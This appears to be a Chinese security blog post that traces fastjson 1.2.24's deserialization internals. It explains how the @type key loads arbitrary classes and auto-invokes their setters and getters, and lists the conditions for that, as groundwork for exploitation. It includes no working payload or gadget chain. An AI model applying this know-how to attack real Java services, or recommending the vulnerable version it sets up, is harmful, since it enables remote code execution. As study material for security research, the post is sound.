<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Fastjson系列 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="FastJson系列前置知识环境搭建：     &lt;dependency&gt;       &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;       &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;       &lt;version&gt;1.2.24&lt;&#x2F;version&gt;     &lt;&#x2F;dep">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson系列">
<meta property="og:url" content="http://example.com/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/index.html">
<meta property="og:site_name" content="Tree&#39;s Blog">
<meta property="og:description" content="FastJson系列前置知识环境搭建：     &lt;dependency&gt;       &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;       &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;       &lt;version&gt;1.2.24&lt;&#x2F;version&gt;     &lt;&#x2F;dep">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/wallhaven-85965k_1920x1080.png">
<meta property="article:published_time" content="2023-08-15T08:46:08.000Z">
<meta property="article:modified_time" content="2023-08-15T08:53:13.560Z">
<meta property="article:author" content="Tree">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/wallhaven-85965k_1920x1080.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/08/15/Fastjson%E7%B3%BB%E5%88%97/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Fastjson系列',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-15 16:53:13'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/wallhaven-85965k_1920x1080.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Fastjson系列</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-15T08:46:08.000Z" title="发表于 2023-08-15 16:46:08">2023-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-15T08:53:13.560Z" title="更新于 2023-08-15 16:53:13">2023-08-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Fastjson系列"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="FastJson系列"><a href="#FastJson系列" class="headerlink" title="FastJson系列"></a>FastJson系列</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>环境搭建：</p>
<pre><code class="xml">    &lt;dependency&gt;
      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
      &lt;version&gt;1.2.24&lt;/version&gt;
    &lt;/dependency&gt;
</code></pre>
<p>如果无法下载源码使用下面命令：</p>
<pre><code>mvn dependency:resolve -Dclassifier=sources
</code></pre>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>先写一个javabean:</p>
<pre><code class="java">package org.example;

public class user &#123;
    private String name;
    private int age;

    public user() &#123;
        System.out.println(&quot;调用构造函数&quot;);
    &#125;

    public String getName() &#123;
        System.out.println(&quot;调用getName&quot;);
        return name;
    &#125;

    public void setName(String name) &#123;
        System.out.println(&quot;调用setName&quot;);
        this.name = name;
    &#125;

    public int getAge() &#123;
        System.out.println(&quot;调用getAge&quot;);
        return age;
    &#125;

    public void setAge(int age) &#123;
        System.out.println(&quot;调用setAge&quot;);
        this.age = age;
    &#125;

&#125;
</code></pre>
<p>然后使用<code>com.alibaba.fastjson.JSON</code>将user对象序列化为json字符串</p>
<pre><code class="java">public static void main( String[] args )
    &#123;
        user A =  new user();
        A.setAge(18);
        A.setName(&quot;Tree&quot;);
        String s = JSON.toJSONString(A);
        System.out.println(s);
&#125;
</code></pre>
<p>输出：</p>
<pre><code class="java">调用构造函数  //user A =  new user();
调用setAge  //A.setAge(18);
调用setName //A.setName(&quot;Tree&quot;);
调用getAge 
调用getName
&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;
</code></pre>
<p>可以看到，使用<code>toJSONString(A)</code>的时候，会自动调用user类的getter方法</p>
<p>同样的，如果使用<code>toJSONString(A, SerializerFeature.WriteClassName)</code></p>
<pre><code class="java">public static void main( String[] args )
    &#123;
        user A =  new user();
        A.setAge(18);
        A.setName(&quot;Tree&quot;);
        String s = JSON.toJSONString(A, SerializerFeature.WriteClassName);
        System.out.println(s);
&#125;
</code></pre>
<p>输出结果：</p>
<pre><code class="java">调用构造函数
调用setAge
调用setName
调用getAge
调用getName
&#123;&quot;@type&quot;:&quot;org.example.user&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;
</code></pre>
<p><code>SerializerFeature.WriteClassName</code>是<code>toJSONString</code>设置的一个属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写上被序列化的类名</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>上面是利用<code>JSON.toJSONString</code>进行序列化，反序列化是利用<code>parse()</code>或<code>parseObject()</code></p>
<p>其实这个<code>parseObject()</code>也是调用了parse()，只是多出了一个JSON.toJSON()处理</p>
<pre><code class="java">public static JSONObject parseObject(String text) &#123;
        Object obj = parse(text);
        if (obj instanceof JSONObject) &#123;
            return (JSONObject) obj;
        &#125;

        return (JSONObject) JSON.toJSON(obj);
    &#125;
</code></pre>
<p>先看看这两个方法的区别</p>
<pre><code class="java">public static void main( String[] args )
    &#123;
      String jsonstr1 = &quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Tree\&quot;&#125;&quot;;
      System.out.println(JSON.parse(jsonstr1));
      System.out.println(JSON.parseObject(jsonstr1));
      System.out.println(JSON.parseObject(jsonstr1, user.class));
&#125;
</code></pre>
<p>输出：</p>
<pre><code>&#123;&quot;name&quot;:&quot;Tree&quot;,&quot;age&quot;:18&#125;
&#123;&quot;name&quot;:&quot;Tree&quot;,&quot;age&quot;:18&#125;
调用构造函数
调用setAge
调用setName
org.example.user@1a7e7ff
</code></pre>
<p>可以看到，当要处理的json字符串为<code>&#123;&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;</code>时，parse(jsonstr1)和parseObject(jsonstr1)执行效果是一样的，如果使用parseObject(jsonstr1, user.class)指定class时，会自动调用这个类的setter方法和构造函数</p>
<p>当要处理的字符串为<code>&#123;&quot;@type&quot;:&quot;org.example.user&quot;,&quot;age&quot;:18,&quot;name&quot;:&quot;Tree&quot;&#125;</code>时</p>
<pre><code class="java">public static void main( String[] args )
    &#123;
      String jsonstr2 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Tree\&quot;&#125;&quot;;
      System.out.println(JSON.parse(jsonstr2));
      System.out.println(JSON.parseObject(jsonstr2));
      System.out.println(JSON.parseObject(jsonstr2, user.class));
&#125;
</code></pre>
<p>输出：</p>
<pre><code class="java">调用构造函数
调用setAge
调用setName
org.example.user@1ef04b5
调用构造函数
调用setAge
调用setName
调用getAge
调用getName
&#123;&quot;name&quot;:&quot;Tree&quot;,&quot;age&quot;:18&#125;
调用构造函数
调用setAge
调用setName
org.example.user@d6993a
</code></pre>
<p>可以看到使用parse处理，会调用<code>org.example.user</code>这个类的构造函数和setter方法，而<code>parseObject</code>是构造方法，setter和getter方法都调用，如果<code>parseObject</code>添加了 指定的类，就只是调用构造方法和set方法 </p>
<p>还可以发现@type的作用是用来指定解析类的</p>
<h3 id="反序列化流程"><a href="#反序列化流程" class="headerlink" title="反序列化流程"></a>反序列化流程</h3><p>这里使用parseObject进行调试，因为这个方法里面已经调用 了parse()方法了</p>
<pre><code class="java">String jsonstr2 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Tree\&quot;&#125;&quot;;
System.out.println(JSON.parseObject(jsonstr2));
</code></pre>
<p>首先来到<code>parseObject()</code>方法</p>
<pre><code class="java">public static JSONObject parseObject(String text) &#123;
        Object obj = parse(text);
        if (obj instanceof JSONObject) &#123;
            return (JSONObject) obj;
        &#125;

        return (JSONObject) JSON.toJSON(obj);
    &#125;
</code></pre>
<p>跟进<code>parse(text)</code></p>
<pre><code class="java">public static Object parse(String text) &#123;
        return parse(text, DEFAULT_PARSER_FEATURE);
    &#125;
</code></pre>
<p>继续跟进</p>
<pre><code class="java">public static Object parse(String text, int features) &#123;
        if (text == null) &#123;
            return null;
        &#125;
        DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features);
        Object value = parser.parse();

        parser.handleResovleTask(value);

        parser.close();

        return value;
    &#125;
</code></pre>
<p>在这里发现，创建了一个<code>DefaultJSONParser</code>对象,构造函数如下， 跟进字符串开头进行设置token,当前开头为<code>&#123;</code>,所以token&#x3D;JSONToken.LBRACE</p>
<pre><code class="java">public DefaultJSONParser(final Object input, final JSONLexer lexer, final ParserConfig config)&#123;
        this.lexer = lexer;
        this.input = input;
        this.config = config;
        this.symbolTable = config.symbolTable;

        int ch = lexer.getCurrent();
        if (ch == &#39;&#123;&#39;) &#123;
            lexer.next();
            ((JSONLexerBase) lexer).token = JSONToken.LBRACE;
        &#125; else if (ch == &#39;[&#39;) &#123;
            lexer.next();
            ((JSONLexerBase) lexer).token = JSONToken.LBRACKET;
        &#125; else &#123;
            lexer.nextToken(); // prime the pump
        &#125;
    &#125;
</code></pre>
<p>然后调用了它的<code>parse()</code>方法，真正的解析是在这里</p>
<p>跟进这个parse()方法</p>
<pre><code class="java">public Object parse() &#123;
        return parse(null);
    &#125;
</code></pre>
<p>继续跟进</p>
<pre><code class="java">public Object parse(Object fieldName) &#123;
        final JSONLexer lexer = this.lexer;
        switch (lexer.token()) &#123;
                ....
                 
             case LBRACE:
                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
                return parseObject(object, fieldName);       
                    
              ....
                
        &#125;
&#125;
</code></pre>
<p>这个解析函数会跟据刚刚构造函数设置的token进入不同的分支，这里就进入了<code>LBRACE</code>分支，跟进<code>parseObject(object, fieldName)</code></p>
<p>在这个parseObject中，前面会解析出key值，再通过if判断是否为<code>@type</code>,如果是并且满足<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code>,大概就是没有禁用特殊键检测，则进入if语句</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230804093612224.png" alt="image-20230804093612224"></p>
<p>进入if语句后，首先通过<code>lexer.scanSymbol(symbolTable, &#39;&quot;&#39;)</code>获取@type对应的value，也就是指定的类名，然后在通过<code>TypeUtils.loadClass</code>加载这个类</p>
<p>loadClass的代码如下：</p>
<pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;
        if (className == null || className.length() == 0) &#123;
            return null;
        &#125;
        Class&lt;?&gt; clazz = mappings.get(className);
        if (clazz != null) &#123;
            return clazz;
        &#125;
        if (className.charAt(0) == &#39;[&#39;) &#123;
            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);
            return Array.newInstance(componentType, 0).getClass();
        &#125;
        if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;
            String newClassName = className.substring(1, className.length() - 1);
            return loadClass(newClassName, classLoader);
        &#125;
        try &#123;
            if (classLoader != null) &#123;
                clazz = classLoader.loadClass(className);
                mappings.put(className, clazz);
                return clazz;
            &#125;
        &#125; catch (Throwable e) &#123;
            e.printStackTrace();
            // skip
        &#125;
        try &#123;
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();

            if (contextClassLoader != null) &#123;
                clazz = contextClassLoader.loadClass(className);
                mappings.put(className, clazz);

                return clazz;
            &#125;
        &#125; catch (Throwable e) &#123;
            // skip
        &#125;
        try &#123;
            clazz = Class.forName(className);
            mappings.put(className, clazz);

            return clazz;
        &#125; catch (Throwable e) &#123;
            // skip
        &#125;
        return clazz;
    &#125;
</code></pre>
<p>首先，检查 className 是否为空或长度为零。如果是，则返回 null。</p>
<p>接着，尝试从 mappings（一个缓存）中获取已加载的类对象。如果找到了，则直接返回。</p>
<p>如果 className 是一个数组类型（以 “[“ 开头），则递归调用 loadClass 方法来加载数组元素类型的类对象，并通过 Array.newInstance 创建一个长度为 0 的数组实例，最后返回其类对象。</p>
<p>如果 className 以 “L” 开头并以 “;” 结尾，说明它是一个带有包名的类名，去除首尾的字符后递归调用 loadClass 方法来加载真实的类对象，并返回。</p>
<p>如果以上条件都不满足，则尝试通过提供的 classLoader 加载类对象。如果 classLoader 不为空，则使用它来加载类，并将加载的类对象保存到 mappings 中，然后返回。</p>
<p>如果使用 classLoader 加载失败，则尝试使用当前线程的上下文类加载器（contextClassLoader）加载类对象，并将加载的类对象保存到 mappings 中，然后返回。</p>
<p>如果前面的步骤都失败，则使用 Class.forName 方法加载指定名称的类对象，并将加载的类对象保存到 mappings 中，最后返回。</p>
<p>如果所有的尝试都失败了，最后返回 null。</p>
<p>回到parseObject中</p>
<pre><code class="java">ObjectDeserializer deserializer = config.getDeserializer(clazz);
return deserializer.deserialze(this, clazz, fieldName);
</code></pre>
<p>这个是进入if判断的结尾，根据加载得到clazz获取反序列化器</p>
<p>跟进<code>getDeserializer</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230804101023264.png" alt="image-20230804101023264"></p>
<p>这里存在一个黑名单限制可以反序列化的类，黑名单里面只有Thread</p>
<p>然后往下，运行到</p>
<pre><code class="java">derializer = createJavaBeanDeserializer(clazz, type);
</code></pre>
<p>跟进createJavaBeanDeserializer方法,里面会调用JavaBeanInfo.build()</p>
<pre><code class="java">JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
</code></pre>
<p>跟进这个build</p>
<p>在这个方法中，会通过反射获取clazz这个类的属性值和方法名,然后就是对setter和getter方法的处理和判断：</p>
<p>setter自动调用需要满足以下条件：</p>
<ul>
<li>方法名长度大于4</li>
</ul>
<pre><code class="java">if (methodName.length() &lt; 4) &#123;
                continue;
            &#125;
</code></pre>
<ul>
<li>非静态方法</li>
</ul>
<pre><code class="java">if (Modifier.isStatic(method.getModifiers())) &#123;
                continue;
            &#125;
</code></pre>
<ul>
<li>返回值为void或者当前类</li>
</ul>
<pre><code class="java">if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;
                continue;
            &#125;
</code></pre>
<ul>
<li>以set开头且第四个字母为大写</li>
</ul>
<pre><code class="java">if (!methodName.startsWith(&quot;set&quot;)) &#123; 
                continue;
            &#125;
            char c3 = methodName.charAt(3);

            String propertyName;
            if (Character.isUpperCase(c3) //
                || c3 &gt; 512 // for unicode method name
            ) &#123;&#125;
</code></pre>
<ul>
<li>参数个数为1个</li>
</ul>
<pre><code class="java">Class&lt;?&gt;[] types = method.getParameterTypes();
            if (types.length != 1) &#123;
                continue;
            &#125;
</code></pre>
<p>解析完setter方法后再处理getter方法</p>
<p>同理：getter自动调用还需要满足以下条件：</p>
<ul>
<li>方法名长度大于4</li>
<li>非静态方法</li>
<li>以get开头且第四个字母为大写</li>
<li>无参数传入</li>
<li>返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
<li>此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</li>
</ul>
<p>解析完后将满足条件的方法添加到fieldList里面</p>
<pre><code class="java">add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,
                                         annotation, fieldAnnotation, null));
</code></pre>
<p>解析完后返回到parseObject()</p>
<pre><code class="java">ObjectDeserializer deserializer = config.getDeserializer(clazz);
return deserializer.deserialze(this, clazz, fieldName);
</code></pre>
<p>在deserializer.deserialze()这里进行了反序列化调用了setter方法，由于调试的时候无法跟进，这里就不分析了</p>
<p>然后返回到JSON类下的 parseObject()</p>
<pre><code class="java">public static JSONObject parseObject(String text) &#123;
        Object obj = parse(text);
        if (obj instanceof JSONObject) &#123;
            return (JSONObject) obj;
        &#125;

        return (JSONObject) JSON.toJSON(obj);
    &#125;
</code></pre>
<p>走完了parse()后调用了setter方法，然后再往下调用JSON.toJSON</p>
<p>运行到这里：</p>
<pre><code class="java">if (serializer instanceof JavaBeanSerializer) &#123;
            JavaBeanSerializer javaBeanSerializer = (JavaBeanSerializer) serializer;
            
            JSONObject json = new JSONObject();
            try &#123;
                Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);
                for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;
                    json.put(entry.getKey(), toJSON(entry.getValue()));
                &#125;
            &#125; catch (Exception e) &#123;
                throw new JSONException(&quot;toJSON error&quot;, e);
            &#125;
            return json;
        &#125;
</code></pre>
<p>跟进<code>getFieldValuesMap</code>,其中javaObject就是@type指定的类</p>
<pre><code class="java">public Map&lt;String, Object&gt; getFieldValuesMap(Object object) throws Exception &#123;
        Map&lt;String, Object&gt; map = new LinkedHashMap&lt;String, Object&gt;(sortedGetters.length);
        
        for (FieldSerializer getter : sortedGetters) &#123;
            map.put(getter.fieldInfo.name, getter.getPropertyValue(object));
        &#125;
        
        return map;
    &#125;
</code></pre>
<p>这里<code>getter.getPropertyValue</code>直接传入参数object,跟进查看</p>
<pre><code class="java">public Object getPropertyValue(Object object) throws InvocationTargetException, IllegalAccessException &#123;
        Object propertyValue =  fieldInfo.get(object);
        if (format != null &amp;&amp; propertyValue != null) &#123;
            if (fieldInfo.fieldClass == Date.class) &#123;
                SimpleDateFormat dateFormat = new SimpleDateFormat(format);
                dateFormat.setTimeZone(JSON.defaultTimeZone);
                return dateFormat.format(propertyValue);
            &#125;
        &#125;
        return propertyValue;
    &#125;
</code></pre>
<p>继续跟进fieldInfo.get(object)</p>
<pre><code class="java"> public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException &#123;
        if (method != null) &#123;
            Object value = method.invoke(javaObject, new Object[0]);
            return value;
        &#125;

        return field.get(javaObject);
    &#125;
</code></pre>
<p>到这里可以看到method.invoke，通过反射调用方法，这里调用的就是getter方法</p>
<p>然后返回到JSON.toJSON </p>
<pre><code class="java">try &#123;
                Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);
                for (Map.Entry&lt;String, Object&gt; entry : values.entrySet()) &#123;
                    json.put(entry.getKey(), toJSON(entry.getValue()));
                &#125;
            &#125; catch (Exception e) &#123;
                throw new JSONException(&quot;toJSON error&quot;, e);
            &#125;
            return json;
</code></pre>
<p>然后通过json.put逐渐构建出json对象，返回json</p>
<p>整个反序列化的过程大概就是这样子了，总的可以知道在处理json字符串的时候<code>parse</code>或<code>parseObject</code>会调用@type指定的类的setter方法给属性赋值，如果要调用getter方法需要使用<code>parseObject</code></p>
<p>就是这个自动调用的特性，造成了序列化漏洞</p>
<h3 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h3><ul>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法会被调用两次；</li>
<li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li>
<li>存在无参构造方法：使用无参构造方法创建对象，并通过反射设置属性值</li>
<li>不存在无参构造方法，但存在有参构造方法：尝试根据 JSON 字符串的属性名称查找相应的构造方法参数，并通过反射调用有参构造方法创建对象，并设置属性值。</li>
</ul>
<p><strong>setter自动调用需要满足以下条件</strong>：</p>
<ul>
<li><p>方法名长度大于4</p>
</li>
<li><p>非静态方法</p>
</li>
<li><p>返回值为void或者当前类</p>
</li>
<li><p>以set开头且第四个字母为大写</p>
</li>
<li><p>参数个数为1个</p>
</li>
</ul>
<p><strong>getter自动调用还需要满足以下条件</strong>：</p>
<ul>
<li>方法名长度大于4</li>
<li>必须是 public 修饰</li>
<li>非静态方法</li>
<li>以get开头且第四个字母为大写</li>
<li>无参数传入</li>
<li>返回值类型继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
<li>此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</li>
</ul>
<p>除此之外Fastjson还有以下功能点：</p>
<ol>
<li>如果目标类中私有变量没有setter方法，但是在反序列化时仍想给这个变量赋值，则需要使用<code>Feature.SupportNonPublicField</code>参数</li>
<li>fastjson 在为类属性寻找getter&#x2F;setter方法时，调用函数<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>方法，会忽略<code>_</code>和<code>-</code>字符串</li>
<li>fastjson 在反序列化时，如果Field类型为byte[]，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code>进行base64解码，在序列化时也会进行base64编码</li>
</ol>
<p><strong>$ref</strong></p>
<p>当fastjson版本&gt;&#x3D;1.2.36时，我们可以使用<code>$ref</code>的方式来调用任意的getter</p>
<table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>{“$ref”:”$”}</td>
<td>引用根对象</td>
</tr>
<tr>
<td>{“$ref”:”@”}</td>
<td>引用自己</td>
</tr>
<tr>
<td>{“$ref”:”..”}</td>
<td>引用父对象</td>
</tr>
<tr>
<td>{“$ref”:”..&#x2F;..”}</td>
<td>引用父对象的父对象</td>
</tr>
<tr>
<td>{“$ref”:”$.members[0].reportTo”}</td>
<td>基于路径的引用</td>
</tr>
</tbody></table>
<p><strong>补充：</strong></p>
<p>在给setter方法设置传入的参数的时候key是根据setter的名字决定的，例如</p>
<pre><code class="java">public void setName(String val) &#123;
        System.out.println(&quot;调用setName&quot;);
        this.n = val;
    &#125;
</code></pre>
<p>如果调用setName的时候设置传入的参数val的值，key的名称只能是name&#x2F;Name ,就是函数名去除掉set&#x2F;get剩余的部分</p>
<pre><code class="java">&#123;&quot;Name&quot;:&quot;xxxxx&quot;&#125;
或者
&#123;&quot;name&quot;:&quot;xxxxx&quot;&#125;
</code></pre>
<p>不能这样</p>
<pre><code class="java">&#123;&quot;n&quot;:&quot;xxxxx&quot;&#125;或者&#123;&quot;val&quot;:&quot;xxxxx&quot;&#125;
</code></pre>
